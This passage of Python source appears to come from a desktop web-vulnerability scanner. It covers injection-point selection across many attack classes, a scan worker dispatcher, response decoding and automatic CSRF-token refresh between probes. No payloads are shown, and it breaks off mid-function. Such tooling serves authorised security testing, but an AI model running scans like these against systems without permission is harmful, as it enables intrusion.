                if re.match(r'^[\w.-]+\.\w{2,}$', v): return True
                return False

            for name, vals in params.items():
                val = vals[0] if vals else ""
                if _ssrf_tier(name, val):
                    defaults.add(f"url:{name}")
            for name, vals in body_params.items():
                val = vals[0] if isinstance(vals, list) and vals else str(vals)
                if _ssrf_tier(name, val):
                    defaults.add(f"body:{name}")
            # Always pre-check the full SSRF header set.
            # Two cases:
            #   1. Header already in the original request (any casing) →
            #      use the ACTUAL stored name as the id so the checkbox in
            #      "☰ HTTP Headers" gets ticked (e.g. "header:referer")
            #   2. Header absent from the original request →
            #      use canonical casing — it will appear as a synthetic entry
            #      in "🞋 SSRF-Specific Headers" (e.g. "header:Referer")
            # Build a lowercase→actual-name lookup for headers in the request.
            _hdr_lower_map = {k.lower(): k for k in headers}
            for hname in SSRF_HEADERS:
                actual = _hdr_lower_map.get(hname.lower())
                defaults.add(f"header:{actual if actual else hname}")

        elif scan in ("Upload",):
            # Upload: body params (file fields)
            for name in body_params:
                defaults.add(f"body:{name}")

        elif scan in ("XXE",):
            # XXE: the entire body is the injection vector when XML.
            # For non-XML bodies, body params get converted to XML (Phase 9).
            # Pre-select all body params + URL params as candidates.
            for name in params:
                defaults.add(f"url:{name}")
            for name in body_params:
                defaults.add(f"body:{name}")

        elif scan in ("NoSQLi",):
            # NoSQLi: all URL params + all body params (any may be injectable)
            for name in params:
                defaults.add(f"url:{name}")
            for name in body_params:
                defaults.add(f"body:{name}")

        elif scan in ("CORS",):
            # CORS: no parameter-level injection points — tests the full endpoint
            # with crafted Origin headers.  No checkboxes to pre-select.
            pass

        elif scan in ("OpenRedirect",):
            # Pre-select params whose names suggest they control a redirect destination.
            _OR_NAMES = {
                "url", "uri", "redirect", "redirecturl", "redirect_url",
                "redirecturi", "redirect_uri", "return", "returnurl", "return_url",
                "returnto", "return_to", "next", "nexturl", "next_url",
                "goto", "go", "dest", "destination", "target", "targeturl",
                "target_url", "link", "href", "forward", "forwardurl",
                "continue", "continueto", "continue_to", "location", "out",
                "path", "to", "open", "success_url", "cancel_url", "callback",
                "callbackurl", "callback_url", "origin", "checkout_url",
                "redir", "rurl", "r", "l", "ref", "referer", "from",
            }
            _OR_SUBSTRS = (
                "url", "uri", "redirect", "return", "next", "goto",
                "dest", "target", "forward", "continue", "link",
                "href", "location", "back", "ref",
            )
            for name, vals in params.items():
                n = name.lower().replace("-", "").replace("_", "")
                val = vals[0] if vals else ""
                is_or = n in _OR_NAMES or any(s in n for s in _OR_SUBSTRS)
                is_url_val = bool(
                    (val and val.startswith("http")) or
                    (val and val.startswith("//")) or
                    (val and val.startswith("/"))
                )
                if is_or or is_url_val:
                    defaults.add(f"url:{name}")
            for name in body_params:
                defaults.add(f"body:{name}")

        elif scan in ("Both",):
            defaults |= _compute_scan_defaults(["XSS", "SQLi"], request_data)
        elif scan in ("WAF",):
            pass  # WAF scans operate on the full URL/request, not injection points
        elif scan in ("SSTI",):
            # SSTI: test all URL params, body params, cookies, and common headers
            for name in params:
                defaults.add(f"url:{name}")
            for name in body_params:
                defaults.add(f"body:{name}")
            for name in cookies:
                defaults.add(f"cookie:{name}")
            for hname in ("User-Agent", "Referer", "X-Forwarded-For", "X-Custom-Header"):
                defaults.add(f"header:{hname}")
        elif scan == "All":
            defaults |= _compute_scan_defaults(
                ["XSS", "SQLi", "LFI", "CMDi", "IDOR", "SSRF", "Upload", "XXE", "NoSQLi", "CORS", "OpenRedirect", "SSTI"],
                request_data
            )

    return defaults


class InjectionPointSelectorDialog(QDialog):
    """
    Pre-scan dialog that analyses all injection points in a request and lets the
    user select which ones to test via checkboxes.

    Points that the chosen scan(s) would test by default are pre-checked.
    Points the scan(s) would normally skip are shown unchecked.
    """

    def __init__(self, request_data: Dict[str, Any], scan_types: List[str],
                 parent=None, points=None):
        super().__init__(parent)
        self.setWindowTitle("⌖ Select Injection Points")
        self.setMinimumWidth(680)
        self.setMinimumHeight(520)

        # Use the pre-filtered points list if provided; otherwise parse fresh.
        # Callers should always pass the filtered list so binary/irrelevant
        # fields (e.g. multipart file fields) are already excluded.
        self._all_points = points if points is not None else _parse_all_injection_points(request_data)
        # Compute what each scan would test by default
        self._defaults = _compute_scan_defaults(scan_types, request_data)
        self._scan_types = scan_types
        self._checkboxes: Dict[str, 'QCheckBox'] = {}  # id → checkbox
        self._init_ui()

    def _init_ui(self):
        root = QVBoxLayout(self)
        root.setSpacing(8)
        root.setContentsMargins(12, 12, 12, 12)

        # Header
        title = QLabel(
            f"<b>⌖ Injection Points</b> — "
            f"<span style='color:#53d8fb'>{', '.join(self._scan_types)}</span> scan"
        )
        title.setStyleSheet("font-size: 11pt;")
        root.addWidget(title)

        n_default = sum(1 for pt in self._all_points if pt["id"] in self._defaults)
        n_total   = len(self._all_points)
        subtitle = QLabel(
            f"✓ <b>{n_default}</b> point(s) pre-checked = what this scan tests by default.  "
            f"Total detected: <b>{n_total}</b>.  Override freely."
        )
        subtitle.setWordWrap(True)
        subtitle.setStyleSheet("color: #bbb; font-size: 8pt;")
        root.addWidget(subtitle)

        sep = QFrame()
        sep.setFrameShape(QFrame.HLine)
        sep.setFrameShadow(QFrame.Sunken)
        root.addWidget(sep)

        # Scroll area
        scroll = QScrollArea()
        scroll.setWidgetResizable(True)
        scroll.setFrameShape(QFrame.NoFrame)
        container = QWidget()
        cl = QVBoxLayout(container)
        cl.setSpacing(6)
        cl.setContentsMargins(4, 4, 4, 4)

        # Group by category
        groups: Dict[str, List[Dict]] = {}
        order: List[str] = []
        for pt in self._all_points:
            cat = pt["category"]
            if cat not in groups:
                groups[cat] = []
                order.append(cat)
            groups[cat].append(pt)

        if not self._all_points:
            lbl = QLabel("⚠ No injection points detected in this request.")
            lbl.setStyleSheet("color: #e0a040;")
            cl.addWidget(lbl)
        else:
            for cat in order:
                pts = groups[cat]
                n_checked = sum(1 for p in pts if p["id"] in self._defaults)
                grp = QGroupBox(f"{cat}  ({n_checked}/{len(pts)} checked by default)")
                grp.setStyleSheet(
                    "QGroupBox { border:1px solid #444; border-radius:4px; "
                    "margin-top:6px; padding-top:4px; font-weight:bold; }"
                    "QGroupBox::title { subcontrol-origin:margin; padding:0 4px; color:#ccc; }"
                )
                grp_layout = QVBoxLayout(grp)
                grp_layout.setSpacing(2)
                grp_layout.setContentsMargins(8, 6, 8, 6)

                for pt in pts:
                    is_default = pt["id"] in self._defaults
                    row_w = QWidget()
                    row_l = QHBoxLayout(row_w)
                    row_l.setContentsMargins(0, 0, 0, 0)
                    row_l.setSpacing(8)

                    cb = QCheckBox()
                    cb.setChecked(is_default)
                    self._checkboxes[pt["id"]] = cb
                    row_l.addWidget(cb)

                    # Type badge
                    type_lbl = QLabel(pt["type"])
                    type_lbl.setFixedWidth(105)
                    type_lbl.setStyleSheet(
                        "color:#53d8fb; font-size:8pt; font-weight:bold;"
                    )
                    row_l.addWidget(type_lbl)

                    # Name
                    name_lbl = QLabel(f"<b>{pt['name']}</b>")
                    name_lbl.setMinimumWidth(110)
                    row_l.addWidget(name_lbl)

                    # Value preview
                    preview = pt["value"][:45] + ("…" if len(pt["value"]) > 45 else "")
                    val_lbl = QLabel(preview)
                    val_lbl.setStyleSheet("color:#aaa; font-size:8pt; font-family:monospace;")
                    val_lbl.setWordWrap(False)
                    row_l.addWidget(val_lbl, 1)

                    # Default / skipped pill
                    if is_default:
                        pill = QLabel("● Default")
                        pill.setStyleSheet(
                            "color:#4caf50; font-size:7pt; border:1px solid #4caf50;"
                            "border-radius:3px; padding:0 3px;"
                        )
                    else:
                        pill = QLabel("○ skipped")
                        pill.setStyleSheet(
                            "color:#777; font-size:7pt; border:1px solid #555;"
                            "border-radius:3px; padding:0 3px;"
                        )
                    row_l.addWidget(pill)

                    grp_layout.addWidget(row_w)

                cl.addWidget(grp)

        cl.addStretch()
        scroll.setWidget(container)
        root.addWidget(scroll, 1)

        # Quick-select row
        qrow = QHBoxLayout()
        qrow.setSpacing(6)

        for label, state in [("✓ All", True), ("✗ None", False)]:
            btn = QPushButton(label)
            btn.setMaximumWidth(80)
            btn.clicked.connect(lambda _, s=state: self._set_all(s))
            qrow.addWidget(btn)

        def_btn = QPushButton("↩ Defaults")
        def_btn.setMaximumWidth(90)
        def_btn.clicked.connect(self._reset_defaults)
        qrow.addWidget(def_btn)

        qrow.addStretch()
        root.addLayout(qrow)

        # ── CSRF token refresh URL ────────────────────────────────────────────
        csrf_sep = QFrame()
        csrf_sep.setFrameShape(QFrame.HLine)
        csrf_sep.setFrameShadow(QFrame.Sunken)
        root.addWidget(csrf_sep)

        csrf_row = QHBoxLayout()
        csrf_row.setSpacing(8)
        csrf_lbl = QLabel("⭮ CSRF Refresh URL:")
        csrf_lbl.setToolTip(
            "Optional — GET this URL before every probe request to fetch a fresh CSRF token.\n"
            "The token is auto-scraped from hidden form fields, meta csrf-token tags,\n"
            "or Set-Cookie headers.  Leave blank if the target has no CSRF protection."
        )
        csrf_lbl.setStyleSheet("color:#ccc; font-size:9pt;")
        csrf_lbl.setFixedWidth(148)
        self._csrf_url_edit = QLineEdit()
        self._csrf_url_edit.setPlaceholderText(
            "https://target.com/login  (optional — leave blank if no CSRF)"
        )
        self._csrf_url_edit.setStyleSheet(
            "background:#1e2535; color:#ccc; border:1px solid #444;"
            "border-radius:3px; padding:3px 6px;"
        )
        csrf_row.addWidget(csrf_lbl)
        csrf_row.addWidget(self._csrf_url_edit, 1)
        root.addLayout(csrf_row)
        # ─────────────────────────────────────────────────────────────────────

        sep2 = QFrame()
        sep2.setFrameShape(QFrame.HLine)
        sep2.setFrameShadow(QFrame.Sunken)
        root.addWidget(sep2)

        dlg_btns = QDialogButtonBox(QDialogButtonBox.Ok | QDialogButtonBox.Cancel)
        dlg_btns.button(QDialogButtonBox.Ok).setText("▶ Start Scan")
        dlg_btns.button(QDialogButtonBox.Cancel).setText("Cancel")
        dlg_btns.accepted.connect(self.accept)
        dlg_btns.rejected.connect(self.reject)
        root.addWidget(dlg_btns)

    def _set_all(self, state: bool):
        for cb in self._checkboxes.values():
            cb.setChecked(state)

    def _reset_defaults(self):
        for pt in self._all_points:
            cb = self._checkboxes.get(pt["id"])
            if cb:
                cb.setChecked(pt["id"] in self._defaults)

    def selected_ids(self) -> List[str]:
        return [pid for pid, cb in self._checkboxes.items() if cb.isChecked()]

    @property
    def csrf_refresh_url(self) -> str:
        """Returns the CSRF refresh URL entered by the user, or '' if blank."""
        return self._csrf_url_edit.text().strip()


class TrafficEntry:
    """Represents a single HTTP request/response in the traffic log"""
    
    def __init__(self, request_data: Dict[str, Any]):
        self.timestamp = datetime.now()
        self.url = request_data.get('url', '')
        self.method = request_data.get('method', 'GET')
        self.status_code = None
        self.response_time = None
        self.content_length = None
        self.request_headers = request_data.get('headers', {})
        self.request_body = request_data.get('body', '')
        self.response_headers = {}
        self.response_body = ''
        self.payload = request_data.get('payload', '')
        self.payload_type = request_data.get('payload_type', '')
        self.error = None
        
    def set_response(self, response, elapsed_time: float):
        """Set response data — assumes response has been pre-processed by _decode_response"""
        try:
            self.status_code    = response.status_code
            self.response_time  = round(elapsed_time, 3)
            self.response_headers = dict(response.headers)
            
            # _decode_response in ScanWorker should have already handled decompression.
            # We can safely access .content here.
            raw_bytes = getattr(response, 'content', b"") or b""
            self.content_length = len(raw_bytes)
            self.response_body = _sanitize_for_display(raw_bytes)
        except Exception as e:
            self.error = str(e)
    
    def set_error(self, error: str):
        """Set error message"""
        self.error = error
        self.status_code = 0
        self.response_time = 0
        self.content_length = 0


class CsrfOptionCDialog(QDialog):
    """
    Compact mid-scan dialog — appears exactly once when Option B (auto-detect)
    fails to find a CSRF token after a 403 response.

    Only asks for the one thing that matters: the URL to GET for a fresh token.
    The scanner will auto-scrape the token from that URL using the same
    html_input → html_meta → cookie → regex chain as Option B.

    Result is stored in self.refresh_url (str) or None if the user skips.
    """

    def __init__(self, csrf_field_names: list, upload_url: str, parent=None):
        super().__init__(parent)
        self.setWindowTitle("✘ CSRF Auto-Detect Failed — Option C")
        self.setMinimumWidth(480)
        self.setWindowModality(Qt.ApplicationModal)
        self.refresh_url: Optional[str] = None   # set on Accept

        layout = QVBoxLayout(self)
        layout.setSpacing(10)

        # ── Header ────────────────────────────────────────────────────────
        title = QLabel("⚠  CSRF Token Could Not Be Auto-Detected")
        font = QFont(); font.setBold(True)
        title.setFont(font)
        layout.addWidget(title)

        fields_str = ", ".join(f'<b>{f}</b>' for f in csrf_field_names)
        info = QLabel(
            f"Token field(s) {fields_str} returned a 403 and the scanner could not\n"
            f"find a fresh token by scraping:\n"
            f"  <code>{upload_url[:72]}{'…' if len(upload_url) > 72 else ''}</code>\n\n"
            "Enter the URL the scanner should GET to obtain a fresh CSRF token.\n"
            "It will auto-scrape the token from the response (HTML input / meta / cookie).\n"
            "This URL will be reused silently for all remaining probes."
        )
        info.setTextFormat(Qt.RichText)
        info.setWordWrap(True)
        layout.addWidget(info)

        sep = QFrame(); sep.setFrameShape(QFrame.HLine); sep.setFrameShadow(QFrame.Sunken)
        layout.addWidget(sep)

        # ── URL input ─────────────────────────────────────────────────────
        layout.addWidget(QLabel("Token refresh URL:"))
        self._url_input = QLineEdit()
        self._url_input.setPlaceholderText("https://example.com/upload-form  or  /api/csrf-token")
        self._url_input.setText(upload_url)   # pre-fill — user clears if wrong
        self._url_input.selectAll()
        layout.addWidget(self._url_input)

        hint = QLabel("Tip: this is usually the page that contains the upload form.")
        hint.setStyleSheet("color: gray; font-size: 11px;")
        layout.addWidget(hint)

        # ── Buttons ───────────────────────────────────────────────────────
        sep2 = QFrame(); sep2.setFrameShape(QFrame.HLine); sep2.setFrameShadow(QFrame.Sunken)
        layout.addWidget(sep2)

        btn_box = QDialogButtonBox()
        btn_use   = btn_box.addButton("Use This URL", QDialogButtonBox.AcceptRole)
        btn_skip  = btn_box.addButton("Skip (ignore tokens for remaining probes)",
                                      QDialogButtonBox.RejectRole)
        btn_use.clicked.connect(self._on_accept)
        btn_skip.clicked.connect(self.reject)
        layout.addWidget(btn_box)

    def _on_accept(self):
        url = self._url_input.text().strip()
        if not url:
            QMessageBox.warning(self, "URL Required",
                                "Please enter a URL or click Skip.")
            return
        self.refresh_url = url
        self.accept()


class ScanWorker(
    QThread,
    XssScanMixin,
    SqliScanMixin,
    LfiScanMixin,
    CmdiScanMixin,
    IdorScanMixin,
    UploadScanMixin,
    SqliHelpersMixin,
    SsrfScanMixin,
    XxeScanMixin,
    NoSqliScanMixin,
    CorsScanMixin,
    OpenRedirectScanMixin,
    SstiScanMixin,
):
    """Background worker for performing vulnerability scans with advanced detection"""
    
    scan_progress = pyqtSignal(str)  # Progress message
    scan_complete = pyqtSignal(dict)  # Scan results
    scan_error = pyqtSignal(str)  # Error message
    traffic_entry = pyqtSignal(object)  # Traffic entry for monitoring
    # Emitted mid-scan when Option B fails — UI shows CsrfOptionCDialog and
    # writes the user's URL back into self.csrf_refresh_url, then sets
    # self._csrf_option_c_ready event so the worker thread can proceed.
    csrf_option_c_needed = pyqtSignal(list, str)  # (csrf_field_names, upload_url)
    # Emitted after each request in step mode so the UI can enable Next button.
    # Carries the probe label (payload string) for the status bar.
    step_paused = pyqtSignal(str)  # probe label
    
    class ErrorResponse:
        """Mock response object for failed requests"""
        def __init__(self, error=""):
            self.status_code = 0
            self.content = b''
            self.text = f'[ERROR] {error}'
            self.headers = {}
            self.error = str(error)
            self.elapsed = 0
            self.ok = False
            self.reason = f"Request failed: {error}"
            self.url = ""
            self.history = []
        
        def __bool__(self):
            return True
        
        def __getattr__(self, name):
            return None
    
    def __init__(self, request_data: Dict[str, Any], scan_type: str, boost_mode: bool = False, upload_base_url: str = None, target_langs: List[str] = None, oast_url: str = None, waf_config: dict = None,
                 scan_timeout: int = 30, scan_req_delay: float = 0.0, scan_max_workers: int = 8,
                 scan_max_retries: int = 1, scan_follow_redirects: bool = True, scan_verify_ssl: bool = False,
                 scan_stop_on_first: bool = False, scan_bool_consensus: int = 2, scan_time_threshold: float = 1.5):
        super().__init__()
        self.request_data = request_data
        self.scan_type = scan_type
        self.boost_mode = boost_mode
        self.upload_base_url = upload_base_url
        self.target_langs = target_langs or ["PHP"]
        self.oast_url = oast_url
        self.waf_config = waf_config or {}
        self.running = True
        self.executor = None
        # Scan configuration
        self.scan_timeout         = scan_timeout
        self.scan_req_delay       = scan_req_delay
        self.scan_max_workers     = scan_max_workers
        self.scan_max_retries     = scan_max_retries
        self.scan_follow_redirects = scan_follow_redirects
        self.scan_verify_ssl      = scan_verify_ssl
        self.scan_stop_on_first   = scan_stop_on_first
        self.scan_bool_consensus  = scan_bool_consensus
        self.scan_time_threshold  = scan_time_threshold
        # Set by ScannerTab.start_scan() when the user has made a custom
        # injection-point selection.  None = no override (each scan uses its
        # own defaults).  Otherwise a set of strings like {"url:id",
        # "cookie:TrackingId", "body:username", "header:User-Agent"}.
        self.forced_injection_points: Optional[set] = None
        # CSRF mid-scan Option C state.
        # csrf_refresh_url   : set by the UI slot after CsrfOptionCDialog is confirmed.
        #                      None = user hasn't been asked yet or chose Skip.
        # _csrf_option_c_ready: threading.Event — worker waits on this while the
        #                      UI shows CsrfOptionCDialog, then proceeds once set.
        # _csrf_option_c_skip : set to True when user clicked Skip — stops
        #                      asking on every subsequent 403.
        import threading as _threading
        self.csrf_refresh_url:    Optional[str]       = None
        self._csrf_option_c_ready = _threading.Event()
        self._csrf_option_c_skip  = False

        # ── One-by-one step mode ─────────────────────────────────────────────────
        # step_mode      : enabled when the "🪜 One by one" preset is selected.
        # _step_event     : cleared before each request; worker waits on it after
        #                   traffic is emitted; UI slot sets it when Next is clicked.
        self.step_mode   = False
        self._step_event = _threading.Event()
        self._step_event.set()   # starts set so the first request runs immediately

        # ── AI Payload Suggester ─────────────────────────────────────────────
        # Set by ScannerTab.start_scan() when the "✨ AI Payloads" checkbox is on.
        # ai_suggest_payloads : boolean gate — False = feature disabled (default).
        # ai_settings         : dict from settings.json used to call the AI provider.
        self.ai_suggest_payloads: bool = False
        self.ai_settings: dict = {}

    def _is_forced_point(self, prefix: str, name: str) -> bool:
        """
        Return True if this injection point should be tested.

        prefix is one of: "url", "body", "json", "cookie", "header"
        name   is the parameter / cookie / header name.

        When forced_injection_points is None (user made no override) → always True.
        Otherwise returns True only if f"{prefix}:{name}" is in the forced set.

        For headers the check is case-insensitive: a header stored as "referer"
        in the original request and selected as "header:referer" in the dialog
        must still match when the scanner calls _is_forced_point("header", "Referer").
        """
        forced = self.forced_injection_points
        if forced is None:
            return True
        exact = f"{prefix}:{name}"
        if exact in forced:
            return True
        # Case-insensitive fallback for headers only
        if prefix == "header":
            name_lower = name.lower()
            return any(
                fid.startswith("header:") and fid[7:].lower() == name_lower
                for fid in forced
            )
        return False

    def run(self):
        """Execute the scan"""
        try:
            if self.scan_type == "XSS":
                results = self.scan_xss()
            elif self.scan_type == "SQLi":
                results = self.scan_sqli()
            elif self.scan_type == "LFI":
                results = self.scan_lfi()
            elif self.scan_type == "CMDi":
                results = self.scan_cmdi()
            elif self.scan_type == "IDOR":
                results = self.scan_idor()
            elif self.scan_type == "Upload":
                results = self.scan_upload()
            elif self.scan_type == "SSRF":
                results = self.scan_ssrf()
            elif self.scan_type == "XXE":
                results = self.scan_xxe()
            elif self.scan_type == "NoSQLi":
                results = self.scan_nosqli()
            elif self.scan_type == "CORS":
                results = self.scan_cors()
            elif self.scan_type == "OpenRedirect":
                results = self.scan_open_redirect()
            elif self.scan_type == "SSTI":
                results = self.scan_ssti()
            elif self.scan_type == "Both":
                if self.boost_mode:
                    self.scan_progress.emit("⚡ BOOST MODE: Running XSS and SQLi scans in parallel")
                    self.executor = concurrent.futures.ThreadPoolExecutor(max_workers=2)
                    try:
                        xss_future  = self.executor.submit(self.scan_xss)
                        sqli_future = self.executor.submit(self.scan_sqli)
                        # Poll so stop() can interrupt without blocking forever
                        for fut in (xss_future, sqli_future):
                            while not fut.done():
                                if not self.running:
                                    break
                                try:
                                    fut.result(timeout=0.25)
                                except concurrent.futures.TimeoutError:
                                    pass
                        xss_results  = xss_future.result() if xss_future.done() else []
                        sqli_results = sqli_future.result() if sqli_future.done() else []
                    finally:
                        self.executor.shutdown(wait=False)
                        self.executor = None
                else:
                    xss_results  = self.scan_xss()
                    sqli_results = self.scan_sqli()
                results = {"xss": xss_results, "sqli": sqli_results}
            elif self.scan_type == "All":
                xss_results    = self.scan_xss()    if self.running else []
                sqli_results   = self.scan_sqli()   if self.running else []
                lfi_results    = self.scan_lfi()    if self.running else []
                cmdi_results   = self.scan_cmdi()   if self.running else []
                idor_results   = self.scan_idor()   if self.running else []
                upload_results = self.scan_upload() if self.running else []
                ssrf_results   = self.scan_ssrf()   if self.running else []
                xxe_results    = self.scan_xxe()    if self.running else []
                nosqli_results  = self.scan_nosqli()        if self.running else []
                cors_results   = self.scan_cors()           if self.running else []
                open_redirect_results = self.scan_open_redirect() if self.running else []
                ssti_results          = self.scan_ssti()          if self.running else []
                results = {
                    "xss":    xss_results,
                    "sqli":   sqli_results,
                    "lfi":    lfi_results,
                    "cmdi":   cmdi_results,
                    "idor":   idor_results,
                    "upload": upload_results,
                    "ssrf":   ssrf_results,
                    "xxe":    xxe_results,
                    "nosqli": nosqli_results,
                    "cors":   cors_results,
                    "open_redirect": open_redirect_results,
                    "ssti":   ssti_results,
                }
            elif "," in self.scan_type:
                results = {}
                for stype in self.scan_type.split(","):
                    if not self.running:
                        break
                    stype = stype.strip()
                    if   stype == "XSS":    results["xss"]    = self.scan_xss()
                    elif stype == "SQLi":   results["sqli"]   = self.scan_sqli()
                    elif stype == "LFI":    results["lfi"]    = self.scan_lfi()
                    elif stype == "CMDi":   results["cmdi"]   = self.scan_cmdi()
                    elif stype == "IDOR":   results["idor"]   = self.scan_idor()
                    elif stype == "Upload": results["upload"] = self.scan_upload()
                    elif stype == "SSRF":   results["ssrf"]   = self.scan_ssrf()
                    elif stype == "XXE":    results["xxe"]    = self.scan_xxe()
                    elif stype == "NoSQLi":  results["nosqli"] = self.scan_nosqli()
                    elif stype == "CORS":         results["cors"]          = self.scan_cors()
                    elif stype == "OpenRedirect": results["open_redirect"] = self.scan_open_redirect()
                    elif stype == "SSTI":          results["ssti"]          = self.scan_ssti()
            else:
                results = {"error": "Unknown scan type"}

            self.scan_complete.emit(results)
        except Exception as e:
            logger.error(f"Scan error: {e}")
            self.scan_error.emit(str(e))
    
    @staticmethod
    def _decode_response(resp):
        """
        Ensure resp.content and resp.text are always readable.

        Root cause of the [ERROR] gzip messages:
          Apache (and some CDNs/proxies) ignore Accept-Encoding: identity and
          compress the body anyway, then an intermediate layer (urllib3's
          transparent decompression, a reverse proxy, or HTTP/2 framing)
          decompresses it before we see it — but leaves Content-Encoding: gzip
          in the headers.  When resp.content is accessed, urllib3 sees the
          header, tries to gunzip already-plain bytes, and raises:
              "Error -3 while decompressing data: incorrect header check"

        Strategy — read the raw bytes first, then decide:
          1. Body starts with gzip magic (\\x1f\\x8b) → it really is compressed,
             decompress manually.
          2. Body does NOT start with gzip magic but header claims gzip/deflate
             → it was already decompressed upstream; use the bytes as-is and
             strip the stale Content-Encoding header.
          3. resp.content succeeded on its own → nothing to do.
          4. Raw bytes unreadable → leave resp alone, let caller handle it.
        """
        import gzip as _gzip
        import zlib as _zlib

        if resp is None or not hasattr(resp, "headers"):
            return resp

        encoding = resp.headers.get("Content-Encoding", "").lower()
        if encoding not in ("gzip", "deflate", "br"):
            # No compression claimed — nothing to do.
            return resp

        # ── Helper: patch the response object in place ────────────────────
        def _patch(body_bytes: bytes):
            """Store decoded bytes and strip the stale Content-Encoding header."""
            resp._content          = body_bytes
            resp._content_consumed = True
            try:
                resp.headers._store.pop("content-encoding", None)
            except Exception:
                try:
                    del resp.headers["Content-Encoding"]
                except Exception:
                    pass

        # ── Step 1: try to read the raw bytes before urllib3 touches them ─
        # decode_content=False gives us whatever is on the wire (or already
        # buffered) without urllib3 attempting decompression.
        raw = b""
        try:
            raw = resp.raw.read(decode_content=False)
        except Exception:
            # If stream is already closed, raw might be empty.
            # The content might be in resp.raw.data if preloaded.
            try:
                if hasattr(resp.raw, 'data'):
                    raw = resp.raw.data
            except Exception:
                pass

        # If raw is empty, urllib3 may have already consumed and buffered the
        # content (e.g. after a redirect).  Try the normal path.
        if not raw:
            if getattr(resp, "_content_consumed", False) and resp._content not in (False, None):
                # Already decoded successfully — just strip the bad header.
                # But only if encoding header is present, otherwise we assume it's correct
                if encoding:
                    _patch(resp._content)
                return resp
            try:
                _ = resp.content
                _patch(resp._content)
                return resp
            except requests.exceptions.ContentDecodingError:
                # This is the key error. The raw data is in an internal buffer.
                try:
                    raw = resp.raw.data
                except AttributeError:
                    return resp # Give up, can't get raw data
            except Exception:
                return resp  # For other errors, give up

        # ── Step 2: magic-byte check ──────────────────────────────────────
        # Gzip streams always start with \x1f\x8b.  If our raw bytes don't,
        # the body was already decompressed upstream — use it as plaintext.
        GZIP_MAGIC = b"\x1f\x8b"

        if encoding == "gzip":
            if not raw.startswith(GZIP_MAGIC):
                # Header lies — body is already plain text.  Use it directly.
                _patch(raw)
                return resp
            # Body really is gzip — decompress manually.
            try:
                _patch(_gzip.decompress(raw))
                return resp
            except Exception:
                try:
                    # Non-standard gzip header — try zlib with wbits=47
                    # (32+15 = auto-detect gzip/zlib wrapper)
                    _patch(_zlib.decompress(raw, 47))
                    return resp
                except Exception:
                    # Decompression failed entirely — use raw bytes so the
                    # caller at least gets something rather than an exception.
                    _patch(raw)
                    return resp

        elif encoding == "deflate":
            try:
                _patch(_zlib.decompress(raw))
                return resp
            except Exception:
                try:
                    _patch(_zlib.decompress(raw, -15))  # raw deflate (no zlib wrapper)
                    return resp
                except Exception:
                    _patch(raw)
                    return resp

        else:
            # br (brotli) or unknown — we can't decompress; strip the header
            # so resp.text doesn't choke and return whatever bytes we have.
            _patch(raw)
            return resp

    # ─────────────────────────────────────────────────────────────────────────
    # CSRF token pre-flight refresh
    # ─────────────────────────────────────────────────────────────────────────

    # ── One-by-one step mode gate ─────────────────────────────────────────────
    def _step_wait(self, label: str = ""):
        """
        In step mode: emit step_paused(label) so the UI enables the Next button,
        then block the worker thread until the user clicks Next (which calls
        self._step_event.set()).  No-op when step_mode is False.
        """
        if not getattr(self, "step_mode", False):
            return
        if not getattr(self, "running", True):
            return
        self._step_event.clear()
        self.step_paused.emit(label)
        while not self._step_event.wait(timeout=0.2):
            if not self.running:
                break

    def _do_csrf_preflight(self, headers: dict, body: str):
        """
        If self.csrf_refresh_url is set, GET that URL, scrape the latest CSRF
        token, and return (headers, body) with the token patched in.

        Scraping order:
          1. <input type="hidden" name="X" value="Y"> where X looks like a token
          2. <meta name="X" content="Y"> where X looks like a csrf-token tag
          3. Set-Cookie response cookies whose name contains csrf / xsrf

        Patching order (for each scraped (name, value)):
          • Cookie header  – replace matching cookie name's value
          • URL-encoded body – replace matching param's value
          • JSON body       – replace matching top-level key's value
          • Request headers – replace X-CSRF-Token / X-XSRF-Token header value

        Returns un-mutated (headers, body) unchanged when:
          – no csrf_refresh_url is configured, or
          – the refresh request fails, or
          – no tokens are found in the response.
        """
        refresh_url = getattr(self, "csrf_refresh_url", None)
        if not refresh_url:
            return headers, body
        # Guard against recursion (the refresh GET itself calls this method)
        if getattr(self, "_csrf_preflight_active", False):
            return headers, body

        self._csrf_preflight_active = True
        try:
            # Use same auth/session cookies as the main scan, but no content-type
            _keep = {"cookie", "authorization", "user-agent", "referer", "accept",
                     "accept-language"}
            refresh_headers = {k: v for k, v in headers.items()
                               if k.lower() in _keep}

            resp = requests.get(
                refresh_url,
                headers=refresh_headers,
                timeout=getattr(self, "scan_timeout", 30),
                verify=getattr(self, "scan_verify_ssl", False),
                allow_redirects=True,
            )

            html_body = getattr(resp, "text", "") or ""
            new_tokens: Dict[str, str] = {}

            # ── 1. HTML hidden inputs (both attribute orders) ──────────────
            for pat in (
                r'<input[^>]+type=["\']?hidden["\']?[^>]+name=["\']?([^"\'>\s]+)["\']?[^>]+value=["\']([^"\']*)["\']',
                r'<input[^>]+value=["\']([^"\']*)["\'][^>]+name=["\']?([^"\'>\s]+)["\']?[^>]+type=["\']?hidden["\']?',
            ):
                for m in re.finditer(pat, html_body, re.IGNORECASE):
                    n, v = (m.group(1), m.group(2)) if "name" in pat.split("value")[0] else (m.group(2), m.group(1))
                    if re.search(r'csrf|xsrf|token|_token', n, re.IGNORECASE):
                        new_tokens[n] = v

            # ── 2. Meta csrf-token tags (both attribute orders) ────────────
            for pat in (
                r'<meta[^>]+name=["\']?([^"\'>\s]+)["\']?[^>]+content=["\']([^"\']*)["\']',
                r'<meta[^>]+content=["\']([^"\']*)["\'][^>]+name=["\']?([^"\'>\s]+)["\']?',
            ):
                for m in re.finditer(pat, html_body, re.IGNORECASE):
                    n, v = (m.group(1), m.group(2)) if pat.index("name") < pat.index("content") else (m.group(2), m.group(1))
                    if re.search(r'csrf|xsrf|token', n, re.IGNORECASE):
                        new_tokens[n] = v

            # ── 3. Response cookies ────────────────────────────────────────
            for cname, cval in resp.cookies.items():
                if re.search(r'csrf|xsrf', cname, re.IGNORECASE):
                    new_tokens[cname] = cval

            if not new_tokens:
                return headers, body

            self.scan_progress.emit(
                f"  \ud83d\udd04 [CSRF] Refreshed token(s): "
                + ", ".join(f"{n}={v[:16]}{'…' if len(v) > 16 else ''}"
                            for n, v in new_tokens.items())
            )

            headers = dict(headers)  # don't mutate caller's dict

            # ── Patch Cookie header ────────────────────────────────────────
            cookie_key = next((k for k in headers if k.lower() == "cookie"), None)
            if cookie_key:
                parts = [c.strip() for c in headers[cookie_key].split(";")]
                new_parts = []
                replaced: set = set()
                for part in parts:
                    if "=" in part:
                        cname, _ = part.split("=", 1)
                        cname = cname.strip()
